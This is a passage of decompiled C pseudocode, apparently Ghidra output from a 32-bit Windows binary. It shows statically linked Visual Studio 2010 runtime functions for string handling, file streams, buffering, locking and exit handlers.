    bVar3 = (byte)((uint)uVar2 >> 0x10);
    bVar4 = bVar3 < ((byte *)_Str2)[2];
    if (bVar3 != ((byte *)_Str2)[2]) break;
    if (bVar3 == 0) {
      return 0;
    }
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    bVar4 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_003b1514:
  return (uint)bVar4 * -2 + 1;
}



// Library Function - Single Match
//  _strtok_s
// 
// Library: Visual Studio 2010 Release

char * __cdecl _strtok_s(char *_Str,char *_Delim,char **_Context)

{
  byte bVar1;
  int *piVar2;
  char *pcVar3;
  int iVar4;
  byte *extraout_EDX;
  byte *pbVar5;
  undefined4 *puVar6;
  undefined4 local_28 [8];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  if (((_Context == (char **)0x0) || (_Delim == (char *)0x0)) ||
     ((_Str == (char *)0x0 && (*_Context == (char *)0x0)))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_003b60f9();
    pbVar5 = extraout_EDX;
  }
  else {
    puVar6 = local_28;
    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    do {
      bVar1 = *_Delim;
      pbVar5 = (byte *)((int)local_28 + (uint)(bVar1 >> 3));
      *pbVar5 = *pbVar5 | '\x01' << (bVar1 & 7);
      _Delim = (char *)((byte *)_Delim + 1);
    } while (bVar1 != 0);
    pbVar5 = (byte *)_Str;
    if (_Str == (char *)0x0) {
      pbVar5 = (byte *)*_Context;
    }
    for (; (bVar1 = *pbVar5,
           (*(byte *)((int)local_28 + (uint)(bVar1 >> 3)) & (byte)(1 << (bVar1 & 7))) != 0 &&
           (bVar1 != 0)); pbVar5 = pbVar5 + 1) {
    }
    for (; *pbVar5 != 0; pbVar5 = pbVar5 + 1) {
      if ((*(byte *)((int)local_28 + (uint)(*pbVar5 >> 3)) & (byte)(1 << (*pbVar5 & 7))) != 0) {
        *pbVar5 = 0;
        pbVar5 = pbVar5 + 1;
        break;
      }
    }
    *_Context = (char *)pbVar5;
  }
  pcVar3 = (char *)terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,pbVar5,(char)_Str)
  ;
  return pcVar3;
}



// Library Function - Single Match
//  _memchr
// 
// Library: Visual Studio

void * __cdecl _memchr(void *_Buf,int _Val,size_t _MaxCount)

{
  uint uVar1;
  uint uVar2;
  uint *puVar3;
  char cVar4;
  uint uVar5;
  bool bVar6;
  
  if (_MaxCount != 0) {
    uVar5 = _Val & 0xff;
    uVar2 = (uint)_Buf & 3;
    while (uVar2 != 0) {
                    // WARNING: Load size is inaccurate
      cVar4 = *_Buf;
      _Buf = (void *)((int)_Buf + 1);
      if (cVar4 == (char)_Val) goto LAB_003b16d6;
      _MaxCount = _MaxCount - 1;
      if (_MaxCount == 0) {
        return (uint *)0x0;
      }
      uVar2 = (uint)_Buf & 3;
    }
    uVar2 = _MaxCount - 4;
    if (3 < _MaxCount) {
      uVar5 = uVar5 * 0x1010101;
      puVar3 = (uint *)_Buf;
      do {
        _Buf = puVar3 + 1;
        if (((*puVar3 ^ uVar5 ^ 0xffffffff ^ (*puVar3 ^ uVar5) + 0x7efefeff) & 0x81010100) != 0) {
          uVar1 = *puVar3;
          cVar4 = (char)uVar5;
          if ((char)uVar1 == cVar4) {
            return puVar3;
          }
          if ((char)(uVar1 >> 8) == cVar4) {
            return (uint *)((int)puVar3 + 1);
          }
          if ((char)((uVar1 & 0xffff0000) >> 0x10) == cVar4) {
            return (uint *)((int)puVar3 + 2);
          }
          if ((char)((uVar1 & 0xffff0000) >> 0x18) == cVar4) goto LAB_003b16d6;
        }
        bVar6 = 3 < uVar2;
        uVar2 = uVar2 - 4;
        puVar3 = (uint *)_Buf;
      } while (bVar6);
    }
    for (_MaxCount = uVar2 + 4; (uint *)_MaxCount != (uint *)0x0; _MaxCount = _MaxCount + -1) {
                    // WARNING: Load size is inaccurate
      cVar4 = *_Buf;
      _Buf = (void *)((int)_Buf + 1);
      if (cVar4 == (char)uVar5) {
LAB_003b16d6:
        return (uint *)((int)_Buf + -1);
      }
    }
  }
  return (void *)_MaxCount;
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2010 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



void __cdecl FUN_003b1703(char *param_1)

{
  _atol(param_1);
  return;
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2010 Release

PVOID __cdecl __onexit_nolock(PVOID param_1)

{
  PVOID *_Memory;
  PVOID *ppvVar1;
  size_t sVar2;
  size_t sVar3;
  PVOID pvVar4;
  int iVar5;
  
  _Memory = (PVOID *)DecodePointer(Ptr_003ea168);
  ppvVar1 = (PVOID *)DecodePointer(Ptr_003ea164);
  if ((ppvVar1 < _Memory) || (iVar5 = (int)ppvVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return (PVOID)0x0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return (PVOID)0x0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return (PVOID)0x0;
      }
    }
    ppvVar1 = (PVOID *)((int)pvVar4 + (iVar5 >> 2) * 4);
    Ptr_003ea168 = EncodePointer(pvVar4);
  }
  pvVar4 = EncodePointer(param_1);
  *ppvVar1 = pvVar4;
  Ptr_003ea164 = EncodePointer(ppvVar1 + 1);
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2010 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_003b591e();
  p_Var1 = (_onexit_t)__onexit_nolock(_Func);
  FUN_003b182b();
  return p_Var1;
}



void FUN_003b182b(void)

{
  FUN_003b5927();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(void *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  _fputc
//  _putc
// 
// Library: Visual Studio 2010 Release

int __cdecl FID_conflict__fputc(int _Ch,FILE *_File)

{
  int *piVar1;
  uint uVar2;
  undefined *puVar3;
  uint local_20;
  
  local_20 = 0;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    return 0xffffffff;
  }
  __lock_file(_File);
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    uVar2 = __fileno(_File);
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar3 = &DAT_003d6e00;
    }
    else {
      puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar2 >> 5]);
    }
    if ((puVar3[0x24] & 0x7f) == 0) {
      if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
        puVar3 = &DAT_003d6e00;
      }
      else {
        puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar2 >> 5]);
      }
      if ((puVar3[0x24] & 0x80) == 0) goto LAB_003b18fe;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    local_20 = 0xffffffff;
  }
LAB_003b18fe:
  if (local_20 == 0) {
    piVar1 = &_File->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      local_20 = __flsbuf(_Ch,_File);
    }
    else {
      *_File->_ptr = (char)_Ch;
      local_20 = _Ch & 0xff;
      _File->_ptr = _File->_ptr + 1;
    }
  }
  FUN_003b193c();
  return local_20;
}



void FUN_003b193c(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



undefined ** _GOST_KEY_TRANSPORT_it(void)

{
  return &PTR_DAT_003d61e0;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_003d61e0) || ((FILE *)&DAT_003d6440 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)(_File + -0x1eb0f) >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Library: Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x3d61df < _File) && (_File < (FILE *)0x3d6441)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_003b8677(((int)(_File + -0x1eb0f) >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2010 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_003b8677(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __ungetc_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __ungetc_nolock(int _Ch,FILE *_File)

{
  char *pcVar1;
  uint uVar2;
  int *piVar3;
  undefined *puVar4;
  
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    uVar2 = __fileno(_File);
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar4 = &DAT_003d6e00;
    }
    else {
      puVar4 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar2 >> 5]);
    }
    if ((puVar4[0x24] & 0x7f) == 0) {
      if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
        puVar4 = &DAT_003d6e00;
      }
      else {
        puVar4 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar2 >> 5]);
      }
      if ((puVar4[0x24] & 0x80) == 0) goto LAB_003b1b7c;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_003b60f9();
  }
  else {
LAB_003b1b7c:
    if (_Ch != -1) {
      uVar2 = _File->_flag;
      if (((uVar2 & 1) != 0) || (((char)uVar2 < '\0' && ((uVar2 & 2) == 0)))) {
        if (_File->_base == (char *)0x0) {
          __getbuf(_File);
        }
        if (_File->_ptr == _File->_base) {
          if (_File->_cnt != 0) {
            return 0xffffffff;
          }
          _File->_ptr = _File->_ptr + 1;
        }
        _File->_ptr = _File->_ptr + -1;
        pcVar1 = _File->_ptr;
        if ((*(byte *)&_File->_flag & 0x40) == 0) {
          *pcVar1 = (char)_Ch;
        }
        else {
          if (*pcVar1 != (char)_Ch) {
            _File->_ptr = pcVar1 + 1;
            return 0xffffffff;
          }
        }
        _File->_cnt = _File->_cnt + 1;
        _File->_flag = _File->_flag & 0xffffffefU | 1;
        return _Ch & 0xff;
      }
    }
  }
  return 0xffffffff;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ungetc
// 
// Library: Visual Studio 2010 Release

int __cdecl _ungetc(int _Ch,FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __ungetc_nolock(_Ch,_File);
    FUN_003b1c3b();
  }
  return iVar2;
}



void FUN_003b1c3b(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0xc));
  return;
}



// Library Function - Single Match
//  _strchr
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2019

char * __cdecl _strchr(char *_Str,int _Val)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar1 = (uint)_Str & 3;
  while (uVar1 != 0) {
    if (*_Str == (char)_Val) {
      return (char *)(uint *)_Str;
    }
    if (*_Str == '\0') {
      return (char *)(uint *)0x0;
    }
    uVar1 = (uint)(uint *)((int)_Str + 1) & 3;
    _Str = (char *)(uint *)((int)_Str + 1);
  }
  while( true ) {
    while( true ) {
      uVar1 = *(uint *)_Str;
      uVar4 = uVar1 ^ CONCAT22(CONCAT11((char)_Val,(char)_Val),CONCAT11((char)_Val,(char)_Val));
      uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;
      puVar5 = (uint *)((int)_Str + 4);
      if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;
      _Str = (char *)puVar5;
      if ((uVar3 & 0x81010100) != 0) {
        if ((uVar3 & 0x1010100) != 0) {
          return (char *)(uint *)0x0;
        }
        if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {
          return (char *)(uint *)0x0;
        }
      }
    }
    uVar1 = *(uint *)_Str;
    if ((char)uVar1 == (char)_Val) {
      return (char *)(uint *)_Str;
    }
    if ((char)uVar1 == '\0') {
      return (char *)(uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 8);
    if (cVar2 == (char)_Val) {
      return (char *)(uint *)((int)_Str + 1);
    }
    if (cVar2 == '\0') break;
    cVar2 = (char)(uVar1 >> 0x10);
    if (cVar2 == (char)_Val) {
      return (char *)(uint *)((int)_Str + 2);
    }
    if (cVar2 == '\0') {
      return (char *)(uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 0x18);
    if (cVar2 == (char)_Val) {
      return (char *)(uint *)((int)_Str + 3);
    }
    _Str = (char *)puVar5;
    if (cVar2 == '\0') {
      return (char *)(uint *)0x0;
    }
  }
  return (char *)(uint *)0x0;
}



// Library Function - Single Match
//  _fgetpos
// 
// Library: Visual Studio 2010 Release

int __cdecl _fgetpos(FILE *_File,fpos_t *_Pos)

{
  int *piVar1;
  int iVar2;
  longlong lVar3;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    return -1;
  }
  if (_Pos == (fpos_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    iVar2 = -1;
  }
  else {
    lVar3 = __ftelli64(_File);
    *(int *)_Pos = (int)lVar3;
    iVar2 = -1;
    *(int *)((int)_Pos + 4) = (int)((ulonglong)lVar3 >> 0x20);
    if (lVar3 != -1) {
      iVar2 = 0;
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  __fseeki64_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fseeki64_nolock(FILE *_File,longlong _Offset,int _Origin)

{
  uint uVar1;
  int _FileHandle;
  int *piVar2;
  longlong lVar3;
  
  if (((_File->_flag & 0x83U) == 0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar3 = __ftelli64_nolock(_File);
      _Offset = _Offset + lVar3;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else {
      if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
        _File->_bufsiz = 0x200;
      }
    }
    _FileHandle = __fileno(_File);
    lVar3 = __lseeki64(_FileHandle,_Offset,_Origin);
    if (lVar3 != -1) {
      return 0;
    }
  }
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __fseeki64
// 
// Library: Visual Studio 2010 Release

int __cdecl __fseeki64(FILE *_File,longlong _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseeki64_nolock(_File,_Offset,_Origin);
    FUN_003b1e8a();
  }
  return iVar2;
}



void FUN_003b1e8a(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2010 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_003eb1a0; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_003ea180 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_003ea180 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else {
          if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
            iVar2 = __fflush_nolock(_File_00);
            if (iVar2 == -1) {
              local_28 = -1;
            }
          }
        }
      }
      FUN_003b1fe6();
    }
  }
  FUN_003b2015();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_003b1fe6(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_003ea180 + unaff_ESI * 4));
  return;
}



void FUN_003b2015(void)

{
  FUN_003b8677(1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fflush
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _fflush(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    __lock_file(_File);
    iVar1 = __fflush_nolock(_File);
    FUN_003b2067();
  }
  return iVar1;
}



void FUN_003b2067(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  _fgetc
//  _getc
// 
// Library: Visual Studio 2010 Release

int __cdecl FID_conflict__getc(FILE *_File)

{
  int *piVar1;
  uint uVar2;
  undefined *puVar3;
  uint local_20;
  
  local_20 = 0;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    return 0xffffffff;
  }
  __lock_file(_File);
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    uVar2 = __fileno(_File);
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar3 = &DAT_003d6e00;
    }
    else {
      puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar2 >> 5]);
    }
    if ((puVar3[0x24] & 0x7f) == 0) {
      if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
        puVar3 = &DAT_003d6e00;
      }
      else {
        puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_003ea060)[(int)uVar2 >> 5]);
      }
      if ((puVar3[0x24] & 0x80) == 0) goto LAB_003b2130;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    local_20 = 0xffffffff;
  }
LAB_003b2130:
  if (local_20 == 0) {
    piVar1 = &_File->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      local_20 = __filbuf(_File);
    }
    else {
      local_20 = (uint)(byte)*_File->_ptr;
      _File->_ptr = _File->_ptr + 1;
    }
  }
  FUN_003b2166();
  return local_20;
}



void FUN_003b2166(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  _fsetpos
// 
// Library: Visual Studio 2010 Release

int __cdecl _fsetpos(FILE *_File,fpos_t *_Pos)

{
  int *piVar1;
  int iVar2;
  
  if ((_File != (FILE *)0x0) && (_Pos != (fpos_t *)0x0)) {
    iVar2 = __fseeki64(_File,*_Pos,0);
    return iVar2;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  FUN_003b60f9();
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _setvbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl _setvbuf(FILE *_File,char *_Buf,int _Mode,size_t _Size)

{
  int *piVar1;
  uint uVar2;
  uint _Size_00;
  int local_20;
  
  local_20 = 0;
  if (_File == (FILE *)0x0) goto LAB_003b21c7;
  if (_Mode == 4) {
LAB_003b21f0:
    if ((_Mode == 0) || (_Mode == 0x40)) goto LAB_003b21f9;
  }
  else {
    if (_Mode != 0) {
      if (_Mode != 0x40) goto LAB_003b21c7;
      goto LAB_003b21f0;
    }
LAB_003b21f9:
    if (0x7ffffffd < _Size - 2) {
LAB_003b21c7:
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_003b60f9();
      return -1;
    }
  }
  _Size_00 = _Size & 0xfffffffe;
  __lock_file(_File);
  __flush(_File);
  __freebuf(_File);
  _File->_flag = _File->_flag & 0xffffc2f3;
  if ((_Mode & 4U) == 0) {
    if (_Buf != (char *)0x0) {
      uVar2 = _File->_flag | 0x500;
      goto LAB_003b2271;
    }
    _Buf = (char *)__malloc_crt(_Size_00);
    if ((int *)_Buf == (int *)0x0) {
      _DAT_003d7ce0 = _DAT_003d7ce0 + 1;
      local_20 = -1;
      goto LAB_003b2280;
    }
    _File->_flag = _File->_flag | 0x408;
  }
  else {
    uVar2 = _File->_flag | 4;
    _Buf = (char *)&_File->_charbuf;
    _Size_00 = 2;
LAB_003b2271:
    _File->_flag = uVar2;
  }
  _File->_bufsiz = _Size_00;
  _File->_base = _Buf;
  _File->_ptr = _Buf;
  _File->_cnt = 0;
LAB_003b2280:
  FUN_003b2295();
  return local_20;
}



void FUN_003b2295(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_003b22ac:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_003b22b6:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        FUN_003aee70((undefined4 *)_Dst,(undefined4 *)_Src,_MaxCount);
        goto LAB_003b22ac;
      }
      trim_string((undefined (*) [16])_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_003b22b6;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    FUN_003b60f9();
  }
  return eVar1;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2010 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  undefined4 *_Buf;
  uint local_c;
  undefined4 *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar7 = _Size * _Count;
      uVar6 = uVar7;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar6 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_003b2456;
          }
          uVar5 = uVar6;
          if (uVar3 <= uVar6) {
            uVar5 = uVar3;
          }
          FUN_003aee70((undefined4 *)_File->_ptr,(undefined4 *)_DstBuf,uVar5);
          _File->_cnt = _File->_cnt - uVar5;
          _File->_ptr = _File->_ptr + uVar5;
          uVar6 = uVar6 - uVar5;
LAB_003b2412:
          local_8 = (undefined4 *)((int)_DstBuf + uVar5);
          _DstBuf = local_8;
        }
        if (local_c <= uVar6) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_003b2456;
          uVar4 = uVar6;
          if (local_c != 0) {
            uVar4 = uVar6 - uVar6 % local_c;
          }
          _Buf = (undefined4 *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            uVar5 = uVar4;
            if (uVar3 <= uVar4) {
              uVar5 = uVar3;
            }
            uVar6 = uVar6 - uVar5;
            if (uVar4 <= uVar3) goto LAB_003b2412;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_003b2456:
          return (uVar7 - uVar6) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_003b2456;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar6 = uVar6 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_003b24db();
      return sVar2;
    }
    piVar1 = __errno();
